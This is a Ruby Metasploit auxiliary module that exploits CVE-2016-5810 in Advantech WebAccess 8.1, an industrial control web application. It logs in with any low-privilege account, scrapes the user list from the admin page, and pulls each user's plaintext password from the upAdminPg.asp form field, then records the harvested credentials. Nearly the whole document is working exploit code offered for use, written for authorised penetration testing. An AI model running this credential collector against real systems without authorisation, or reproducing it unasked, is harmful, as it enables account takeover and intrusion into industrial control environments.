##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Advantech WebAccess 8.1 Post Authentication Credential Collector",
      'Description'    => %q{
        This module allows you to log into Advantech WebAccess 8.1, and collect all of the credentials.
        Although authentication is required, any level of user permission can exploit this vulnerability.

        Note that 8.2 is not suitable for this.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'h00die', # Pointed out the obvious during a PR review for CVE-2017-5154
          'sinn3r', # Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2016-5810'],
          ['URL', 'https://github.com/rapid7/metasploit-framework/pull/7859#issuecomment-274305229']
        ],
      'DisclosureDate' => "Jan 21 2017"
    ))

    register_options(
      [
        OptString.new('WEBACCESSUSER', [true, 'Username for Advantech WebAccess', 'admin']),
        OptString.new('WEBACCESSPASS', [false, 'Password for Advantech WebAccess', '']),
        OptString.new('TARGETURI', [true, 'The base path to Advantech WebAccess', '/']),
      ])
  end

  def do_login
    vprint_status("Attempting to login as '#{datastore['WEBACCESSUSER']}:#{datastore['WEBACCESSPASS']}'")

    uri = normalize_uri(target_uri.path, 'broadweb', 'user', 'signin.asp')

    res = send_request_cgi({
      'method'    => 'POST',
      'uri'       => uri,
      'vars_post' => {
        'page' => '/',
        'pos'  => '',
        'username' => datastore['WEBACCESSUSER'],
        'password' => datastore['WEBACCESSPASS'],
        'remMe'    => '',
        'submit1'  => 'Login'
      }
    })

    unless res
      fail_with(Failure::Unknown, 'Connection timed out while trying to login')
    end

    if res.headers['Location'] && res.headers['Location'] == '/broadweb/bwproj.asp'
      print_good("Logged in as #{datastore['WEBACCESSUSER']}")
      report_cred(
        user: datastore['WEBACCESSUSER'],
        password: datastore['WEBACCESSPASS'],
        status: Metasploit::Model::Login::Status::SUCCESSFUL
      )
      return res.get_cookies.scan(/(ASPSESSIONID\w+=\w+);/).flatten.first || ''
    end

    print_error("Unable to login as '#{datastore['WEBACCESSUSER']}:#{datastore['WEBACCESSPASS']}'")

    nil
  end

  def get_user_cred_detail(sid, user)
    vprint_status("Gathering password for user: #{user}")

    uri = normalize_uri(target_uri.path, 'broadWeb','user', 'upAdminPg.asp')

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => uri,
      'cookie' => sid,
      'vars_get' => {
        'uname' => user
      }
    })

    unless res
      print_error("Unable to gather password for user #{user} due to a connection timeout")
      return nil
    end

    html = res.get_html_document
    pass_field = html.at('input[@name="Password"]')

    pass_field ? pass_field.attributes['value'].text : nil
  end

  def get_users_page(sid)
    vprint_status("Checking user page...")

    uri = normalize_uri(target_uri.path, 'broadWeb', 'user', 'AdminPg.asp')

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => uri,
      'cookie' => sid
    })

    unless res
      fail_with(Failure::Unknown, 'Connection timed out while checking AdminPg.asp')
    end

    html = res.get_html_document

    users = html.search('a').map { |a|
      Rex::Text.uri_decode(a.attributes['href'].text.scan(/broadWeb\/user\/upAdminPg\.asp\?uname=(.+)/).flatten.first || '')
    }.delete_if { |user| user.blank? }

    users
  end

  def report_cred(opts)
    service_data = {
      address: rhost,
      port: rport,
      service_name: 'webaccess',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: DateTime.now,
      core: create_credential(credential_data),
      status: opts[:status],
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def run
    cookie = do_login
    users = get_users_page(cookie)

    users.each do |user|
      pass = get_user_cred_detail(cookie, user)

      if pass
        report_cred(
          user: user,
          password: pass,
          status: Metasploit::Model::Login::Status::SUCCESSFUL,
          proof: 'AdminPg.asp'
        )

        print_good("Found password: #{user}:#{pass}")
      end
    end
  end
end
